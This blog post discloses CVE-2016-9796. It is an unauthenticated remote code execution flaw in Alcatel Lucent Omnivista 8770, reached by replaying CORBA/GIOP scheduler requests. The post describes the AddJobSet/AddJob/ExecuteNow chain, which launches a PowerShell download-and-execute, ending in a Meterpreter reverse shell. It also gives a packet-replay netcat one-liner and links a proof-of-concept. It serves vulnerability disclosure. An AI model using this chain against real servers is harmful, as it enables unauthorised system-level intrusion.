[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEha5yNi8Dd14IY4Zej13EMQUbmY7aFRBIsvA5ATccS1LtmicH2usy7ZSbf0K7pH13kzd0_vJgL8VEq8fOa7Jb5u9Uxm3j7CN-HX_XsCvLehyphenhyphenCOvwSyeoCfGukOlX9N5wDiHh5RTjgFVw-0/s640/s1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEha5yNi8Dd14IY4Zej13EMQUbmY7aFRBIsvA5ATccS1LtmicH2usy7ZSbf0K7pH13kzd0_vJgL8VEq8fOa7Jb5u9Uxm3j7CN-HX_XsCvLehyphenhyphenCOvwSyeoCfGukOlX9N5wDiHh5RTjgFVw-0/s1600/s1.png)

ORB is an abstraction which defines the mechanisms responsible for creating, sending and locating the object references used in the remote calls. Behind an ORB, there is more and in fact an object is defined by interfaces, using the IDL language (Interface Definition Language). IDL allows CORBA to be programming language independent - imagine a Java client that can invoke a remote object written in C++. These are the "flexibility" and neutrality features of CORBA. There are also other components, such as stab, and runtime code which is not covered in this blog post (see references at the bottom for more detailed information).

Many implementations exists that support ORB architectures, such as [OmniORB](http://omniorb.sourceforge.net/index.html), used by the Omnivista solution.

The communication aspect which regards the client and server interaction for object-oriented remote procedure calls is covered by GIOP and IIOP.

GIOP (General Inter-ORB Protocol) is the general protocol that defines the network communication between a client and a server. GIOP is transport layer independent and its level of abstraction is higher that IIOP. IIOP (Internet Inter-ORB Protocol) is a specialisation of GIOP, which defines CORBA communication over TCP/IP transport layer.

To summarize again with a high-level diagram, this is what it looks like when a client and server communicates (image courtesy of [User:Alksentrs](https://en.wikipedia.org/w/index.php?curid=18751499)):

[![](https://upload.wikimedia.org/wikipedia/en/thumb/f/f0/Orb.svg/401px-Orb.svg.png)](https://upload.wikimedia.org/wikipedia/en/thumb/f/f0/Orb.svg/401px-Orb.svg.png)

Wireshark has a built-in decoder for GIOP packets and their structure. An example of GIOP request packet exchanged between the Omnivista client ORB and server's ORB is shown below. Highlighted elements are of interest for understanding how CORBA/GIOP works in this case.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFOImoHlVv3tzez-dCAfgObKq92sJUMn6t-JmNzh-el65lB9Bp7G-0jKd0uMu_0bwRNGW9jdCzY3r19TMbFOhNNZzkzqmp9XNiCb18NBSifJHjcRORK-C9RcypoivG6QsatxwjDKiF5DU/s640/s2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFOImoHlVv3tzez-dCAfgObKq92sJUMn6t-JmNzh-el65lB9Bp7G-0jKd0uMu_0bwRNGW9jdCzY3r19TMbFOhNNZzkzqmp9XNiCb18NBSifJHjcRORK-C9RcypoivG6QsatxwjDKiF5DU/s1600/s2.png)

The 30024 TCP port is the port at which the ORB is listening on the server-side.

The GIOP packet per se is defined by different elements. We see an header which includes the message type (request) and size. Then the request part itself that contains various elements, such as object key length, object key and the request operation. Then the stub data is empty in this case, but this represents the request "body" or better the parameters which might be included within the request.

The object key is used by the ORB on the server side along with the request operation. The request operation is the IDL identifier naming, within the context of the interface, basically the operation being invoked. The request operation and object key are passed to the ORB on the server-side, by providing the call and the arguments to the listening service.

For a full technical specification of the GIOP protocol packet, which is beyond the scope of this blog post, the following [paper](http://www.omg.org/cgi-bin/doc?formal/2002-05-15.pdf) is recommended.

The Omnivista server makes use of multiple OmniORB ORBs listening on different ports. A full network scan of the Omnivista shows multiple "omniORB and CORBA naming services". Below, the result of an nmap scan filtered on GIOP ports:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgo0rHvad1fClI20T2oZ8Ky8gS_BrDQcwsLd49bE6yqhckKEC76K1rq-UKcd0KqAxr4wC0OhnDIRcis4MQlN768coAGihB3T0ztnDGpWuaBJuBVWkZOvicvD4HcEH9x_qva4EQLIBnZx34/s640/giop-services.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgo0rHvad1fClI20T2oZ8Ky8gS_BrDQcwsLd49bE6yqhckKEC76K1rq-UKcd0KqAxr4wC0OhnDIRcis4MQlN768coAGihB3T0ztnDGpWuaBJuBVWkZOvicvD4HcEH9x_qva4EQLIBnZx34/s1600/giop-services.png)

**Where is the bug and how it can be exploited?**

The bug derives from the fact that determined ORBs are exposed and they can be invoked without authentication. Also, the ORBs allow access to interfaces on the server which can be abused or misused to achieve code execution. The attacker only needs to reproduce a sequence of requests/responses in order to abuse such ORBs and execute arbitrary code on the server.

Let's see step by step where the vulnerability lies and how it was discovered. First, by using the Omnivista client itself I tried to understand how it works, what it is possible to do and what features/things can be invoked.

This is a screen shot of the GUI, after successful authentication:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmgiYhsIpcCBdW_CTOGWIkYRvh5ZsucaULDbMUTuA8xviEINVmg12BwF3K30ufaTKoduwAi8HMuu9UQx2irpvQ8msHgG8kjRjqgBgW3NF_fK2eCTDfgxON98h3sJQQ9OzXkIki17IT8qI/s640/s3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgmgiYhsIpcCBdW_CTOGWIkYRvh5ZsucaULDbMUTuA8xviEINVmg12BwF3K30ufaTKoduwAi8HMuu9UQx2irpvQ8msHgG8kjRjqgBgW3NF_fK2eCTDfgxON98h3sJQQ9OzXkIki17IT8qI/s1600/s3.png)

Under the setup tab, the scheduler component attracted my attention. I then noticed that a user can create a job, add a task and then the possibility to add a reference to an executable on the server's system.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6yvCW-_1Ca9gIgZNxZMqgKroLIitUCME2VqKw5MopFJial8ieuGtqzC2a9bjiKq5N23M1jp8KoOBpd1kttOqCb3S4MFZe3RWeEgjVbx0wZ1YFma3HhvEeGCvDqcQXNcWvGqG6ZzVLEM8/s640/s4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6yvCW-_1Ca9gIgZNxZMqgKroLIitUCME2VqKw5MopFJial8ieuGtqzC2a9bjiKq5N23M1jp8KoOBpd1kttOqCb3S4MFZe3RWeEgjVbx0wZ1YFma3HhvEeGCvDqcQXNcWvGqG6ZzVLEM8/s1600/s4.png)

Once the task is added, a job can be executed, leading to the launching of an executable. For instance, I created a job task which would execute "C:\windows\system32\cmd.exe" with an argument as "/c notepad.exe".

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-sI20I4v2mhyr398KFyHohXD_IKkeBJe0nK8RfaAprGgmr7eK8J07vVrtxWcaIr0L9Zl240ioRqeqAbbRyLgA4Ojbl1avA0opYrfsnfVSIBg1dS0zUUsmZlkQjVTTbqq5on_a0R_0sEQ/s640/scheduler_with_cmd.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-sI20I4v2mhyr398KFyHohXD_IKkeBJe0nK8RfaAprGgmr7eK8J07vVrtxWcaIr0L9Zl240ioRqeqAbbRyLgA4Ojbl1avA0opYrfsnfVSIBg1dS0zUUsmZlkQjVTTbqq5on_a0R_0sEQ/s1600/scheduler_with_cmd.png)

Then I executed the job to see how the feature works.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhq5P6SQ7qMzAJsOJIGRoFqqJG0eNOzPthai1kfdaNTTPzzJVH4BpZkgf0-VnHCBumGEKemLZSWw-f-fR2Op1NKTPvmz81fNnbJxNVtX83dxppIPWZAZyOKvZpFwlsNpE2Tp1iN6rjAaqA/s640/execute-job.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhq5P6SQ7qMzAJsOJIGRoFqqJG0eNOzPthai1kfdaNTTPzzJVH4BpZkgf0-VnHCBumGEKemLZSWw-f-fR2Op1NKTPvmz81fNnbJxNVtX83dxppIPWZAZyOKvZpFwlsNpE2Tp1iN6rjAaqA/s1600/execute-job.png)

On the server, I observed the task which is indeed executed and notepad.exe is launched:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTqR8GZDNp4GGSHyZmZO7qQakmGQ_h7Pih0rWvxJgiVqln537ApEGseKIyUxLkWAaUe3u1mJnr7ukmoyp0wX6IEGl7RLdApZ1rON3lcVJf7SdB5YNY81YAzXSgBIbBAIBE47GXoV-4-oo/s640/process-on-server.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTqR8GZDNp4GGSHyZmZO7qQakmGQ_h7Pih0rWvxJgiVqln537ApEGseKIyUxLkWAaUe3u1mJnr7ukmoyp0wX6IEGl7RLdApZ1rON3lcVJf7SdB5YNY81YAzXSgBIbBAIBE47GXoV-4-oo/s1600/process-on-server.png)

As authenticated administrators these operations might be "acceptable", but what if an attacker is able to do the same from a remote position and without authentication?

When facing unusual technologies, the best recommendation is to analyze traffic between client and server while using all the functionality provided by the target software. In this case, the Omnvista client (a Java thick-client) was connecting to determined ports using the GIOP protocol. By examining packets, it is possible to understand what requests and responses occur between the client and server.

One of the major drawbacks in the way Omnivista has implemented CORBA/GIOP is the fact that replay attacks are possible, due to the lack of a proper session mechanism, although security and authentication has been implemented within the Omnivista product itself.

My first attempt to prove this point was to replay a request/action that can only be performed post authentication. For instance, among the sniffed GIOP packets, I picked the "addJob" request and see if replayed from a different machine with a different IP address without authenticating, would lead to the same result/response.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTY3BD_KHdZ_4f9M4Pao_YZJXiTo5EtJgjQL1JNiSApkDM917r9Wwnu7wSblpdlTRrzbVGlY77mx8jBrx4DgKlekVifD_74TzqGVw8F6gLQwXK3CPMEiTC1-GGk0U-Rby44ZIoEoPVUH0/s640/addjob.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTY3BD_KHdZ_4f9M4Pao_YZJXiTo5EtJgjQL1JNiSApkDM917r9Wwnu7wSblpdlTRrzbVGlY77mx8jBrx4DgKlekVifD_74TzqGVw8F6gLQwXK3CPMEiTC1-GGk0U-Rby44ZIoEoPVUH0/s1600/addjob.png)

By first analysing the packet, I noticed that no session token/nonce or challenge seems to be in the payload so I thought I was going in the right direction.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjntLUDql9JZ2BINinf0cruEqkyzv9W8ZD0Csi1BZpvw7_1OZOEyDkZLfpL4-jWZuFJfVWdWTFpEu6cGXu0THZ7_VMPED6FAIKY6T48id9bsycEh1SDyQrlevdh-nAH2pBV-NlWmjoXHpk/s640/giop-body.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjntLUDql9JZ2BINinf0cruEqkyzv9W8ZD0Csi1BZpvw7_1OZOEyDkZLfpL4-jWZuFJfVWdWTFpEu6cGXu0THZ7_VMPED6FAIKY6T48id9bsycEh1SDyQrlevdh-nAH2pBV-NlWmjoXHpk/s1600/giop-body.png)

I removed the BBBBB task using a valid session just to ensure that my action would re-create the task with the same name. I extracted the packet and sent the single packet and got the same response from the server! Went back to check the client and the task was back there!

That sounded extremely promising, now I had to understand the entire attack flow and prepare the exploit chain.

**Exploit chain**

So after analysis of the entire sequence, the conclusion is that it is possible to achieve unauthenticated remote code execution, by performing a mounted attack using respectively three different operations, such as AddJobSet, AddJob and ExecuteNow. These operations must be executed in sequence by sending valid GIOP packets to the OmniVista server, on TCP port 30024.

Let's now dive into each step:

*1st step - AddJobSet*

The AddJobSet packet is sent – an example below – this packet uses the SchedulerInterface to add a Job set on the server.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9mUi5jGhuwWrrb0YDVAtt4LLDBAU9ZSCoRT8YRezjgUjcEN3fFMkTaBkZNh9hZtEbu0sxN1Qs4vS-Me1G213BAauT35KfQAKzmg3vY6NFud2OwZ8nW30rLLvsZe5M7wqtokgiHoIS0jk/s640/addjobset.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9mUi5jGhuwWrrb0YDVAtt4LLDBAU9ZSCoRT8YRezjgUjcEN3fFMkTaBkZNh9hZtEbu0sxN1Qs4vS-Me1G213BAauT35KfQAKzmg3vY6NFud2OwZ8nW30rLLvsZe5M7wqtokgiHoIS0jk/s1600/addjobset.png)

The SchedulerInterface is the object key of this action and this can be seen in Wireshark too:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHAH0tpjsPlgsbA3H39NTs33nEikd_uoedxBkXaHR4g1ajMQh7YU9-oToisV4oBNoh0A7apDu5GrdIR-dLcL8BGjZfb3_gmhUzGICD4ZY_yI_FGFH3Thssdw5e0-RCxwgl37edpzSxIQY/s1600/objectkey-firstpacket.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHAH0tpjsPlgsbA3H39NTs33nEikd_uoedxBkXaHR4g1ajMQh7YU9-oToisV4oBNoh0A7apDu5GrdIR-dLcL8BGjZfb3_gmhUzGICD4ZY_yI_FGFH3Thssdw5e0-RCxwgl37edpzSxIQY/s1600/objectkey-firstpacket.png)

The response contains now an object key that has to be used in the following requests. In our case, the response contains the object key: 00 00 00 00 36 32 81 55 F8 F4 08 00 61 00 00 00. We will see this object used within the following steps of the attack flow.

*2nd Step: AddJob packet*

In this packet we had the specific job inside the jobset test1, using the object key obtained in the reply from the AddJobSet request. In this case, the object key is highlighted in black in the screen shot below. In this case a job named test2 is set, which would call C:\Windows\System32\cmd.exe executable with an argument, invoking a Powershell web script to download and execute a malicious script hosted on the attacker's server.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQkQkqiF-80PD-j1gY2SiX9Q2xjlH70F6svdJC31dd8dA0CyxLyT-8zYRmSm1QtNCXA-gKNJJbmvhIqLouwtGr2J90fdejBBmxzOt-Gw59XVY8jhoary0bEe-KekMVz-9pi4Ct6gW_5LY/s640/addjob2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQkQkqiF-80PD-j1gY2SiX9Q2xjlH70F6svdJC31dd8dA0CyxLyT-8zYRmSm1QtNCXA-gKNJJbmvhIqLouwtGr2J90fdejBBmxzOt-Gw59XVY8jhoary0bEe-KekMVz-9pi4Ct6gW_5LY/s1600/addjob2.png)

*3rd step: ExecuteNow:*

Once the test2 job is added, then the ExecuteNow method can be launched to execute immediately the job. Again, the same object key (highlighted in black) will be used in this request as well:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfYKwuBxuXqOsozFLnCtfmXzYF2tEf6NQ0PZTLO1P8M1Wor4u8Ei5WKt6QkI1BhGUDR1am8z-pfrTdQzL5Itmva98H6pBTEn_HCMdTPt5OdvX91MUSwqUYBl6qHGUWKdl4S89tPt8Schc/s640/executenow.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfYKwuBxuXqOsozFLnCtfmXzYF2tEf6NQ0PZTLO1P8M1Wor4u8Ei5WKt6QkI1BhGUDR1am8z-pfrTdQzL5Itmva98H6pBTEn_HCMdTPt5OdvX91MUSwqUYBl6qHGUWKdl4S89tPt8Schc/s1600/executenow.png)

Below, the Omni Vista server connects back to the attacker’s machine, concluding our exploit chain in a sweet Meterpreter shell:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsHvldmwJ9rlhjBDED7PrpZrO1ObZhs7Ljyj4p9-WluMSCqqNlmQUelvt9-157okzxGI-kw_Ce1exbHoz4gEHnHxXSAT92LplENdBipTwXtn6BiPIhPmygpD8V1TP_4ZSkuvdYdKVXaWA/s640/meterpreter-reverse.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsHvldmwJ9rlhjBDED7PrpZrO1ObZhs7Ljyj4p9-WluMSCqqNlmQUelvt9-157okzxGI-kw_Ce1exbHoz4gEHnHxXSAT92LplENdBipTwXtn6BiPIhPmygpD8V1TP_4ZSkuvdYdKVXaWA/s1600/meterpreter-reverse.png)

**PoC - Exploit**

Github - python script - <https://github.com/malerisch/omnivista-8770-unauth-rce>

**Video**

**Affected versions:**

Alcatel Lucent Omnivista 8770 2.0, 2.6 and 3.0.

**Disclosure Timeline**

* 16/02/2016 First contact
* 16/02/2016 Response from HSSE to contact to Alcalel Lucent
* 26/04/2016 Report sent to PSIRT Alcatel Lucent
* 26/04/2016 Response from Nokia PSIRT
* 27/04/2016 New contact provided from Nokia - PSIRT Alcatel Lucent
* 09/05/2016 PSIRT provides temporary license/and software download
* 18 May 2016 - Vendor provides download link and temporary license to verify if also version 3.0 is affected
* 30 June 2016 - Version 2.6 is also vulnerable
* 1 July 2016 - Version 3.0 also confirmed as vulnerable
* 1 August 2016 - Patch should be available on November
* 29 October 2016 - Vendor confirms patches for SQLi and XSS vulnerabilities in the product, but no CVE or patch has been assigned for this issue. The vendor position is to refer to the technical guidelines of the product security deployment to mitigate this issue, which means applying proper firewall rules to prevent unauthorised clients to connect to the Omnivista server.
* 2 December 2016 - Contacted Mitre to obtain CVE - CVE assigned is: [CVE-2016-9796](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-9796)

**References and interesting links:**

* GIOP - <https://en.wikipedia.org/wiki/General_Inter-ORB_Protocol>
* CORBA specification - The Common Object Request Broker:
* Architecture and Specification 2.6.1 - <http://www.omg.org/spec/CORBA/2.6.1/PDF/>
* Under the hood: IORs, GIOP and IIOP - IBM - <http://www.ibm.com/developerworks/library/ws-underhood/>

Share

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Labels

[0days](http://blog.malerisch.net/search/label/0days)
[alcatel](http://blog.malerisch.net/search/label/alcatel)
[corba](http://blog.malerisch.net/search/label/corba)
[exploit](http://blog.malerisch.net/search/label/exploit)
[giop](http://blog.malerisch.net/search/label/giop)
[lucent](http://blog.malerisch.net/search/label/lucent)
[omniorb](http://blog.malerisch.net/search/label/omniorb)
[omnivista](http://blog.malerisch.net/search/label/omnivista)
[poc](http://blog.malerisch.net/search/label/poc)
[remote code execution](http://blog.malerisch.net/search/label/remote%20code%20execution)
[unauthenticated](http://blog.malerisch.net/search/label/unauthenticated)

Labels:
[0days](http://blog.malerisch.net/search/label/0days)
[alcatel](http://blog.malerisch.net/search/label/alcatel)
[corba](http://blog.malerisch.net/search/label/corba)
[exploit](http://blog.malerisch.net/search/label/exploit)
[giop](http://blog.malerisch.net/search/label/giop)
[lucent](http://blog.malerisch.net/search/label/lucent)
[omniorb](http://blog.malerisch.net/search/label/omniorb)
[omnivista](http://blog.malerisch.net/search/label/omnivista)
[poc](http://blog.malerisch.net/search/label/poc)
[remote code execution](http://blog.malerisch.net/search/label/remote%20code%20execution)
[unauthenticated](http://blog.malerisch.net/search/label/unauthenticated)

Share

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

1. ![]()[нигретошка](https://www.blogger.com/profile/10338917802232182072)[1 December 2016 at 16:53](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1480607637922#c310271384642585081)

   Great Bro!
   Whether Ommivista runs under system permissions?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=310271384642585081)Replies
   - ![]()[Roberto Suggi Liverani](https://www.blogger.com/profile/00603006078110455351)[1 December 2016 at 20:07](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1480619277829#c5502418461778641451)

     thanks, yes, it runs under system priv

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=5502418461778641451)Replies
     Reply
   Reply
2. ![]()Anonymous[2 December 2016 at 14:37](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1480685870247#c126280816142790468)

   Nice work.
   I have a question, how do you replay a TCP packet? Is there a tool like Burp that allows to replay a packet from wireshark? or do you do that manually using scapy?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=126280816142790468)Replies
   - ![]()[Roberto Suggi Liverani](https://www.blogger.com/profile/00603006078110455351)[6 December 2016 at 09:41](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1481013678424#c4928260074586331929)

     Yes, from wireshark you can extract the hex stream of each packet and save it as an individual file. Then you can simply: cat file | nc x.x.x.x port . In Python, you can see that I used socket in my RCE poc: https://github.com/malerisch/omnivista-8770-unauth-rce/blob/master/omnivista-rce-poc.py

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=4928260074586331929)Replies
     Reply
   Reply
3. ![]()Anonymous[22 December 2016 at 16:27](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1482420422596#c5152815863166040433)

   There is a wrong link :
   Architecture and Specification 2.6.1 - file:///C:/Users/malerisch/Downloads/formal-02-05-15%20(2).pdf

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=5152815863166040433)Replies
   - ![]()[Roberto Suggi Liverani](https://www.blogger.com/profile/00603006078110455351)[30 December 2016 at 17:19](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html?showComment=1483114763606#c275616398294222885)

     thx, corrected.

     [Delete](https://www.blogger.com/delete-comment.g?blogID=5593108060941425908&postID=275616398294222885)Replies
     Reply
   Reply

Add commentLoad more...

#### Post a Comment

### Popular posts from this blog

### [TrendMicro ScanMail for Microsoft Exchange (SMEX) predictable session token - CVE-2015-3326](http://blog.malerisch.net/2016/05/trendmicro-smex-session-predictable-cve-2015-3326.html)

[May 20, 2016](http://blog.malerisch.net/2016/05/trendmicro-smex-session-predictable-cve-2015-3326.html "permanent link")

It's time for another advisory ( CVE-2015-3326 ), a simple one, for a vulnerability which can be found quickly and trivially. For those of you who just want to give a glance at the post, I suggest to directly watch the picture which says it all! The following vulnerability was discovered on TrendMicro SMEX (ScanMail for Microsoft Exchange) 10 SP2 but it affects other versions as well. While surfing the SMEX web administrative interface using a web proxy, I have noticed something in the HTTP request - the session token itself and its format, a number. After observing a significant number of logins, the session token was always represented with an number composed of minimum 4 digits and maximum 5 digits, as shown in the screen shot below:   Although the observed session tokens were never generated sequentially, the lack of a cryptographically strong PRNG for the session identifier, allows a malicious user to trivially guess the token. This attack can be easily ...

Share

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

[1 comment](http://blog.malerisch.net/2016/05/trendmicro-smex-session-predictable-cve-2015-3326.html#comments)

[Read more](http://blog.malerisch.net/2016/05/trendmicro-smex-session-predictable-cve-2015-3326.html "TrendMicro ScanMail for Microsoft Exchange (SMEX) predictable session token - CVE-2015-3326")

### [Microsoft .NET MVC ReDoS (Denial of Service) Vulnerability - CVE-2015-2526 (MS15-101)](http://blog.malerisch.net/2015/09/net-mvc-redos-denial-of-service-vulnerability-cve-2015-2526.html)

[September 10, 2015](http://blog.malerisch.net/2015/09/net-mvc-redos-denial-of-service-vulnerability-cve-2015-2526.html "permanent link")

Microsoft released a security bulletin ( MS15-101 ) describing a .NET MVC Denial of Service vulnerability ( CVE-2015-2526 ) that I reported back in April. This blog post analyses the vulnerability in details, starting from the theory and then providing a PoC exploit against a MVC web application developed with Visual Studio 2013. For those of you who want to see the bug, you can directly skip to the last part of this post or watch the video directly... ;-) A bit of theory The .NET framework (4.5 tested version) uses backtracking regular expression matcher when performing a match against an expression. Backtracking is based on the NFA (non-deterministic finite automata) algorithm engine which is designed to validate all input states. By providing an “evil” regex expression – an expression for which the engine can be forced to calculate an exponential number of states - it is possible to force the engine to calculate an exponential number of states, leading to a condition defined su...

Share

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

[3 comments](http://blog.malerisch.net/2015/09/net-mvc-redos-denial-of-service-vulnerability-cve-2015-2526.html#comments)

[Read more](http://blog.malerisch.net/2015/09/net-mvc-redos-denial-of-service-vulnerability-cve-2015-2526.html "Microsoft .NET MVC ReDoS (Denial of Service) Vulnerability - CVE-2015-2526 (MS15-101)")

### Archive

* [2017
  2](http://blog.malerisch.net/2017/)

  + [April
    2](http://blog.malerisch.net/2017/04/)

* [2016
  4](http://blog.malerisch.net/2016/)

  + [December
    1](http://blog.malerisch.net/2016/12/)

    - [Alcatel Lucent Omnivista or: How I learned GIOP an...](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html)
  + [October
    1](http://blog.malerisch.net/2016/10/)
  + [September
    1](http://blog.malerisch.net/2016/09/)
  + [May
    1](http://blog.malerisch.net/2016/05/)
* [2015
  3](http://blog.malerisch.net/2015/)

  + [September
    1](http://blog.malerisch.net/2015/09/)
  + [April
    2](http://blog.malerisch.net/2015/04/)
* [2014
  1](http://blog.malerisch.net/2014/)

  + [August
    1](http://blog.malerisch.net/2014/08/)
* [2013
  3](http://blog.malerisch.net/2013/)

  + [December
    1](http://blog.malerisch.net/2013/12/)
  + [September
    2](http://blog.malerisch.net/2013/09/)
* [2012
  13](http://blog.malerisch.net/2012/)

  + [December
    8](http://blog.malerisch.net/2012/12/)
  + [October
    1](http://blog.malerisch.net/2012/10/)
  + [June
    1](http://blog.malerisch.net/2012/06/)
  + [April
    3](http://blog.malerisch.net/2012/04/)
* [2011
  2](http://blog.malerisch.net/2011/)

  + [December
    2](http://blog.malerisch.net/2011/12/)

Show more
Show less

### Labels

* [.net](http://blog.malerisch.net/search/label/.net)
* [0day](http://blog.malerisch.net/search/label/0day)
* [0days](http://blog.malerisch.net/search/label/0days)
* [advisory](http://blog.malerisch.net/search/label/advisory)
* [alcatel](http://blog.malerisch.net/search/label/alcatel)
* [avant browser](http://blog.malerisch.net/search/label/avant%20browser)
* [beef](http://blog.malerisch.net/search/label/beef)
* [bookmark](http://blog.malerisch.net/search/label/bookmark)
* [brute force pin callmanager cisco phone](http://blog.malerisch.net/search/label/brute%20force%20pin%20callmanager%20cisco%20phone)
* [burp](http://blog.malerisch.net/search/label/burp)

* [burp extension](http://blog.malerisch.net/search/label/burp%20extension)
* [burp pro](http://blog.malerisch.net/search/label/burp%20pro)
* [burpcsj](http://blog.malerisch.net/search/label/burpcsj)
* [corba](http://blog.malerisch.net/search/label/corba)
* [cors](http://blog.malerisch.net/search/label/cors)
* [crash](http://blog.malerisch.net/search/label/crash)
* [crawljax](http://blog.malerisch.net/search/label/crawljax)
* [csrf](http://blog.malerisch.net/search/label/csrf)
* [CVE-2016-2246](http://blog.malerisch.net/search/label/CVE-2016-2246)
* [cve2015-2526](http://blog.malerisch.net/search/label/cve2015-2526)
* [cve2016-3374](http://blog.malerisch.net/search/label/cve2016-3374)
* [dos](http://blog.malerisch.net/search/label/dos)
* [edge](http://blog.malerisch.net/search/label/edge)
* [exploit](http://blog.malerisch.net/search/label/exploit)
* [feed](http://blog.malerisch.net/search/label/feed)
* [file upload](http://blog.malerisch.net/search/label/file%20upload)
* [firefox](http://blog.malerisch.net/search/label/firefox)
* [giop](http://blog.malerisch.net/search/label/giop)
* [hitb2012ams](http://blog.malerisch.net/search/label/hitb2012ams)
* [hitb2017ams](http://blog.malerisch.net/search/label/hitb2017ams)
* [hp](http://blog.malerisch.net/search/label/hp)
* [html5](http://blog.malerisch.net/search/label/html5)
* [i.maxthon.com](http://blog.malerisch.net/search/label/i.maxthon.com)
* [integer overflow](http://blog.malerisch.net/search/label/integer%20overflow)
* [junit](http://blog.malerisch.net/search/label/junit)
* [kemp](http://blog.malerisch.net/search/label/kemp)
* [kiosk hacking](http://blog.malerisch.net/search/label/kiosk%20hacking)
* [load master](http://blog.malerisch.net/search/label/load%20master)
* [lucent](http://blog.malerisch.net/search/label/lucent)
* [maxthon](http://blog.malerisch.net/search/label/maxthon)
* [mcafee](http://blog.malerisch.net/search/label/mcafee)
* [metasploit](http://blog.malerisch.net/search/label/metasploit)
* [microsoft](http://blog.malerisch.net/search/label/microsoft)
* [ms16-115](http://blog.malerisch.net/search/label/ms16-115)
* [mvc](http://blog.malerisch.net/search/label/mvc)
* [omniorb](http://blog.malerisch.net/search/label/omniorb)
* [omnivista](http://blog.malerisch.net/search/label/omnivista)
* [oracle glassfish](http://blog.malerisch.net/search/label/oracle%20glassfish)
* [pdf](http://blog.malerisch.net/search/label/pdf)
* [poc](http://blog.malerisch.net/search/label/poc)
* [rce](http://blog.malerisch.net/search/label/rce)
* [redos](http://blog.malerisch.net/search/label/redos)
* [regex](http://blog.malerisch.net/search/label/regex)
* [remote code execution](http://blog.malerisch.net/search/label/remote%20code%20execution)
* [root shell](http://blog.malerisch.net/search/label/root%20shell)
* [security](http://blog.malerisch.net/search/label/security)
* [security conference](http://blog.malerisch.net/search/label/security%20conference)
* [selenium](http://blog.malerisch.net/search/label/selenium)
* [selenium ide](http://blog.malerisch.net/search/label/selenium%20ide)
* [smex](http://blog.malerisch.net/search/label/smex)
* [sop](http://blog.malerisch.net/search/label/sop)
* [thinpro](http://blog.malerisch.net/search/label/thinpro)
* [trend micro](http://blog.malerisch.net/search/label/trend%20micro)
* [trendmicro](http://blog.malerisch.net/search/label/trendmicro)
* [tutorial](http://blog.malerisch.net/search/label/tutorial)
* [unauthenticated](http://blog.malerisch.net/search/label/unauthenticated)
* [uxss](http://blog.malerisch.net/search/label/uxss)
* [web application testing](http://blog.malerisch.net/search/label/web%20application%20testing)
* [web hacking](http://blog.malerisch.net/search/label/web%20hacking)
* [xcs](http://blog.malerisch.net/search/label/xcs)
* [xhr](http://blog.malerisch.net/search/label/xhr)
* [xsrf](http://blog.malerisch.net/search/label/xsrf)
* [xss](http://blog.malerisch.net/search/label/xss)
* [zero client](http://blog.malerisch.net/search/label/zero%20client)

Show more
Show less

[Powered by Blogger](https://www.blogger.com)



=== Content from www.exploit-db.com_d238d8b1_20250125_063151.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
